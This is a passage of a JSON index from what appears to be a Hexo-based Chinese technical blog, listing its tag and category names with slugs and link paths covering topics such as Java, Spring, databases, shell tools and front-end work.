"link":"/hexblog/tags/吐槽/"},{"name":"ElasticSearch","slug":"ElasticSearch","link":"/hexblog/tags/ElasticSearch/"},{"name":"代理","slug":"代理","link":"/hexblog/tags/代理/"},{"name":"zsh","slug":"zsh","link":"/hexblog/tags/zsh/"},{"name":"IDEA","slug":"IDEA","link":"/hexblog/tags/IDEA/"},{"name":"二维码","slug":"二维码","link":"/hexblog/tags/二维码/"},{"name":"grep","slug":"grep","link":"/hexblog/tags/grep/"},{"name":"named","slug":"named","link":"/hexblog/tags/named/"},{"name":"dns","slug":"dns","link":"/hexblog/tags/dns/"},{"name":"hostname","slug":"hostname","link":"/hexblog/tags/hostname/"},{"name":"GitHub","slug":"GitHub","link":"/hexblog/tags/GitHub/"},{"name":"JavaScript","slug":"JavaScript","link":"/hexblog/tags/JavaScript/"},{"name":"Android","slug":"Android","link":"/hexblog/tags/Android/"},{"name":"专业词汇","slug":"专业词汇","link":"/hexblog/tags/专业词汇/"},{"name":"WebView","slug":"WebView","link":"/hexblog/tags/WebView/"},{"name":"ssl","slug":"ssl","link":"/hexblog/tags/ssl/"},{"name":"LRU","slug":"LRU","link":"/hexblog/tags/LRU/"},{"name":"ssh","slug":"ssh","link":"/hexblog/tags/ssh/"},{"name":"QuickMedia","slug":"QuickMedia","link":"/hexblog/tags/QuickMedia/"},{"name":"Dubbo","slug":"Dubbo","link":"/hexblog/tags/Dubbo/"},{"name":"git","slug":"git","link":"/hexblog/tags/git/"},{"name":"ZooKeeper","slug":"ZooKeeper","link":"/hexblog/tags/ZooKeeper/"},{"name":"Iterator","slug":"Iterator","link":"/hexblog/tags/Iterator/"},{"name":"tmux","slug":"tmux","link":"/hexblog/tags/tmux/"},{"name":"Grafana","slug":"Grafana","link":"/hexblog/tags/Grafana/"},{"name":"QlExpress","slug":"QlExpress","link":"/hexblog/tags/QlExpress/"},{"name":"curl","slug":"curl","link":"/hexblog/tags/curl/"},{"name":"Win10","slug":"Win10","link":"/hexblog/tags/Win10/"},{"name":"Arthas","slug":"Arthas","link":"/hexblog/tags/Arthas/"},{"name":"编程技巧","slug":"编程技巧","link":"/hexblog/tags/编程技巧/"},{"name":"Email","slug":"Email","link":"/hexblog/tags/Email/"},{"name":"Gson","slug":"Gson","link":"/hexblog/tags/Gson/"},{"name":"Prometheus","slug":"Prometheus","link":"/hexblog/tags/Prometheus/"},{"name":"JNDI","slug":"JNDI","link":"/hexblog/tags/JNDI/"},{"name":"RMI","slug":"RMI","link":"/hexblog/tags/RMI/"},{"name":"证书","slug":"证书","link":"/hexblog/tags/证书/"},{"name":"ncat","slug":"ncat","link":"/hexblog/tags/ncat/"},{"name":"子系统","slug":"子系统","link":"/hexblog/tags/子系统/"},{"name":"BufferedImage","slug":"BufferedImage","link":"/hexblog/tags/BufferedImage/"},{"name":"css","slug":"css","link":"/hexblog/tags/css/"},{"name":"指南","slug":"指南","link":"/hexblog/tags/指南/"},{"name":"工具","slug":"工具","link":"/hexblog/tags/工具/"},{"name":"ffmpeg","slug":"ffmpeg","link":"/hexblog/tags/ffmpeg/"},{"name":"ImageMagic","slug":"ImageMagic","link":"/hexblog/tags/ImageMagic/"},{"name":"logger","slug":"logger","link":"/hexblog/tags/logger/"},{"name":"JavaAgent","slug":"JavaAgent","link":"/hexblog/tags/JavaAgent/"},{"name":"随笔","slug":"随笔","link":"/hexblog/tags/随笔/"},{"name":"google","slug":"google","link":"/hexblog/tags/google/"},{"name":"内购","slug":"内购","link":"/hexblog/tags/内购/"},{"name":"BeanUtil","slug":"BeanUtil","link":"/hexblog/tags/BeanUtil/"},{"name":"Jackson","slug":"Jackson","link":"/hexblog/tags/Jackson/"},{"name":"并发","slug":"并发","link":"/hexblog/tags/并发/"},{"name":"爬虫","slug":"爬虫","link":"/hexblog/tags/爬虫/"},{"name":"JavaWeb","slug":"JavaWeb","link":"/hexblog/tags/JavaWeb/"},{"name":"IO","slug":"IO","link":"/hexblog/tags/IO/"},{"name":"Jquery","slug":"Jquery","link":"/hexblog/tags/Jquery/"},{"name":"Mybatis","slug":"Mybatis","link":"/hexblog/tags/Mybatis/"},{"name":"分库分表","slug":"分库分表","link":"/hexblog/tags/分库分表/"},{"name":"知识要点","slug":"知识要点","link":"/hexblog/tags/知识要点/"},{"name":"Json","slug":"Json","link":"/hexblog/tags/Json/"}],"categories":[{"name":"工作","slug":"工作","link":"/hexblog/categories/工作/"},{"name":"DB","slug":"DB","link":"/hexblog/categories/DB/"},{"name":"面试","slug":"工作/面试","link":"/hexblog/categories/工作/面试/"},{"name":"Shell","slug":"Shell","link":"/hexblog/categories/Shell/"},{"name":"工具","slug":"工具","link":"/hexblog/categories/工具/"},{"name":"Java","slug":"Java","link":"/hexblog/categories/Java/"},{"name":"开源","slug":"开源","link":"/hexblog/categories/开源/"},{"name":"Mysql","slug":"DB/Mysql","link":"/hexblog/categories/DB/Mysql/"},{"name":"Java","slug":"工作/面试/Java","link":"/hexblog/categories/工作/面试/Java/"},{"name":"Nginx","slug":"Shell/Nginx","link":"/hexblog/categories/Shell/Nginx/"},{"name":"Git","slug":"Shell/Git","link":"/hexblog/categories/Shell/Git/"},{"name":"火花","slug":"火花","link":"/hexblog/categories/火花/"},{"name":"工具类","slug":"工具/工具类","link":"/hexblog/categories/工具/工具类/"},{"name":"CMD","slug":"Shell/CMD","link":"/hexblog/categories/Shell/CMD/"},{"name":"Quick系列","slug":"Quick系列","link":"/hexblog/categories/Quick系列/"},{"name":"其他","slug":"Java/其他","link":"/hexblog/categories/Java/其他/"},{"name":"JDK","slug":"Java/JDK","link":"/hexblog/categories/Java/JDK/"},{"name":"JVM","slug":"Java/JVM","link":"/hexblog/categories/Java/JVM/"},{"name":"Spring","slug":"开源/Spring","link":"/hexblog/categories/开源/Spring/"},{"name":"Maven","slug":"Shell/Maven","link":"/hexblog/categories/Shell/Maven/"},{"name":"InfluxDB","slug":"DB/InfluxDB","link":"/hexblog/categories/DB/InfluxDB/"},{"name":"随笔","slug":"随笔","link":"/hexblog/categories/随笔/"},{"name":"前端","slug":"前端","link":"/hexblog/categories/前端/"},{"name":"环境搭建","slug":"Shell/环境搭建","link":"/hexblog/categories/Shell/环境搭建/"},{"name":"Guava","slug":"开源/Guava","link":"/hexblog/categories/开源/Guava/"},{"name":"Bugfix","slug":"Java/Bugfix","link":"/hexblog/categories/Java/Bugfix/"},{"name":"Yaml","slug":"开源/Yaml","link":"/hexblog/categories/开源/Yaml/"},{"name":"Hexo","slug":"开源/Hexo","link":"/hexblog/categories/开源/Hexo/"},{"name":"Python","slug":"Python","link":"/hexblog/categories/Python/"},{"name":"Redis","slug":"开源/Redis","link":"/hexblog/categories/开源/Redis/"},{"name":"QuickTask","slug":"Quick系列/QuickTask","link":"/hexblog/categories/Quick系列/QuickTask/"},{"name":"RabbitMQ","slug":"开源/RabbitMQ","link":"/hexblog/categories/开源/RabbitMQ/"},{"name":"Mongo","slug":"DB/Mongo","link":"/hexblog/categories/DB/Mongo/"},{"name":"使用小结","slug":"开源/Spring/使用小结","link":"/hexblog/categories/开源/Spring/使用小结/"},{"name":"Vue","slug":"前端/Vue","link":"/hexblog/categories/前端/Vue/"},{"name":"问题记录","slug":"Java/问题记录","link":"/hexblog/categories/Java/问题记录/"},{"name":"并发","slug":"Java/JDK/并发","link":"/hexblog/categories/Java/JDK/并发/"},{"name":"ReactJS","slug":"前端/ReactJS","link":"/hexblog/categories/前端/ReactJS/"},{"name":"Docker","slug":"Shell/Docker","link":"/hexblog/categories/Shell/Docker/"},{"name":"问题记录","slug":"开源/Spring/问题记录","link":"/hexblog/categories/开源/Spring/问题记录/"},{"name":"教程","slug":"Python/教程","link":"/hexblog/categories/Python/教程/"},{"name":"Mongo","slug":"Python/Mongo","link":"/hexblog/categories/Python/Mongo/"},{"name":"采坑记录","slug":"Python/采坑记录","link":"/hexblog/categories/Python/采坑记录/"},{"name":"问题记录","slug":"开源/RabbitMQ/问题记录","link":"/hexblog/categories/开源/RabbitMQ/问题记录/"},{"name":"字典","slug":"Python/字典","link":"/hexblog/categories/Python/字典/"},{"name":"函数","slug":"Python/函数","link":"/hexblog/categories/Python/函数/"},{"name":"内置函数","slug":"Python/教程/内置函数","link":"/hexblog/categories/Python/教程/内置函数/"},{"name":"内置函数","slug":"Python/函数/内置函数","link":"/hexblog/categories/Python/函数/内置函数/"},{"name":"DB","slug":"工作/面试/DB","link":"/hexblog/categories/工作/面试/DB/"},{"name":"缓存","slug":"工作/面试/缓存","link":"/hexblog/categories/工作/面试/缓存/"},{"name":"实战系列","slug":"开源/Spring/实战系列","link":"/hexblog/categories/开源/Spring/实战系列/"},{"name":"MySql","slug":"Python/MySql","link":"/hexblog/categories/Python/MySql/"},{"name":"QuickFix","slug":"Quick系列/QuickFix","link":"/hexblog/categories/Quick系列/QuickFix/"},{"name":"使用手册","slug":"Quick系列/QuickFix/使用手册","link":"/hexblog/categories/Quick系列/QuickFix/使用手册/"},{"name":"方案设计","slug":"Quick系列/QuickFix/方案设计","link":"/hexblog/categories/Quick系列/QuickFix/方案设计/"},{"name":"容器","slug":"Java/JDK/容器","link":"/hexblog/categories/Java/JDK/容器/"},{"name":"IO","slug":"Java/IO","link":"/hexblog/categories/Java/IO/"},{"name":"OGNL","slug":"开源/OGNL","link":"/hexblog/categories/开源/OGNL/"},{"name":"Node","slug":"前端/Node","link":"/hexblog/categories/前端/Node/"},{"name":"Solr","slug":"开源/Solr","link":"/hexblog/categories/开源/Solr/"},{"name":"QuickAlarm","slug":"Quick系列/QuickAlarm","link":"/hexblog/categories/Quick系列/QuickAlarm/"},{"name":"AES","slug":"Java/AES","link":"/hexblog/categories/Java/AES/"},{"name":"Chrome","slug":"前端/Chrome","link":"/hexblog/categories/前端/Chrome/"},{"name":"吐槽","slug":"随笔/吐槽","link":"/hexblog/categories/随笔/吐槽/"},{"name":"小技巧","slug":"Python/小技巧","link":"/hexblog/categories/Python/小技巧/"},{"name":"ElasticSearch","slug":"开源/ElasticSearch","link":"/hexblog/categories/开源/ElasticSearch/"},{"name":"IDEA","slug":"工具/IDEA","link":"/hexblog/categories/工具/IDEA/"},{"name":"QuickMedia","slug":"Quick系列/QuickMedia","link":"/hexblog/categories/Quick系列/QuickMedia/"},{"name":"GitHub","slug":"随笔/GitHub","link":"/hexblog/categories/随笔/GitHub/"},{"name":"JavaScript","slug":"前端/JavaScript","link":"/hexblog/categories/前端/JavaScript/"},{"name":"Android","slug":"Java/Android","link":"/hexblog/categories/Java/Android/"},{"name":"其他","slug":"其他","link":"/hexblog/categories/其他/"},{"name":"问题记录","slug":"Java/Android/问题记录","link":"/hexblog/categories/Java/Android/问题记录/"},{"name":"Dubbo","slug":"开源/Dubbo","link":"/hexblog/categories/开源/Dubbo/"},{"name":"调试","slug":"开源/Dubbo/调试","link":"/hexblog/categories/开源/Dubbo/调试/"},{"name":"ZooKeeper","slug":"开源/ZooKeeper","link":"/hexblog/categories/开源/ZooKeeper/"},{"name":"运维","slug":"开源/运维","link":"/hexblog/categories/开源/运维/"},{"name":"QlExpress","slug":"开源/QlExpress","link":"/hexblog/categories/开源/QlExpress/"},{"name":"Win10","slug":"Win10","link":"/hexblog/categories/Win10/"},{"name":"Arthas","slug":"开源/Arthas","link":"/hexblog/categories/开源/Arthas/"},{"name":"开发环境","slug":"Win10/开发环境","link":"/hexblog/categories/Win10/开发环境/"},{"name":"编程技巧","slug":"Java/编程技巧","link":"/hexblog/categories/Java/编程技巧/"},{"name":"Email","slug":"Java/Email","link":"/hexblog/categories/Java/Email/"},{"name":"Gson","slug":"开源/Gson","link":"/hexblog/categories/开源/Gson/"},{"name":"JNDI","slug":"Java/JNDI","link":"/hexblog/categories/Java/JNDI/"},{"name":"环境","slug":"Java/Android/环境","link":"/hexblog/categories/Java/Android/环境/"},{"name":"quick-media","slug":"Quick系列/quick-media","link":"/hexblog/categories/Quick系列/quick-media/"},{"name":"Css","slug":"前端/Css","link":"/hexblog/categories/前端/Css/"},{"name":"Maven","slug":"Shell/Git/Maven","link":"/hexblog/categories/Shell/Git/Maven/"},{"name":"插件系列","slug":"工具/插件系列","link":"/hexblog/categories/工具/插件系列/"},{"name":"idea","slug":"随笔/idea","link":"/hexblog/categories/随笔/idea/"},{"name":"项目","slug":"Python/项目","link":"/hexblog/categories/Python/项目/"},{"name":"Agent","slug":"Java/Agent","link":"/hexblog/categories/Java/Agent/"},{"name":"实战","slug":"实战","link":"/hexblog/categories/实战/"},{"name":"google","slug":"Java/Android/google","link":"/hexblog/categories/Java/Android/google/"},{"name":"故障实录","slug":"实战/故障实录","link":"/hexblog/categories/实战/故障实录/"},{"name":"Jackson","slug":"开源/Jackson","link":"/hexblog/categories/开源/Jackson/"},{"name":"一封","slug":"Java/Android/一封","link":"/hexblog/categories/Java/Android/一封/"},{"name":"QuickCrawler","slug":"Quick系列/QuickCrawler","link":"/hexblog/categories/Quick系列/QuickCrawler/"},{"name":"JavaWeb","slug":"Java/JavaWeb","link":"/hexblog/categories/Java/JavaWeb/"},{"name":"Jquery","slug":"前端/Jquery","link":"/hexblog/categories/前端/Jquery/"},{"name":"Mybatis","slug":"开源/Mybatis","link":"/hexblog/categories/开源/Mybatis/"},{"name":"QuickSpi","slug":"Quick系列/QuickSpi","link":"/hexblog/categories/Quick系列/QuickSpi/"},{"name":"Hystrix","slug":"开源/Hystrix","link":"/hexblog/categories/开源/Hystrix/"},{"name":"分库分表","slug":"DB/分库分表","link":"/hexblog/categories/DB/分库分表/"},{"name":"基本功系列","slug":"基本功系列","link":"/hexblog/categories/基本功系列/"},{"name":"Spring","slug":"工作/面试/Spring","link":"/hexblog/categories/工作/面试/Spring/"},{"name":"Json","slug":"开源/Json","link":"/hexblog/categories/开源/Json/"}]}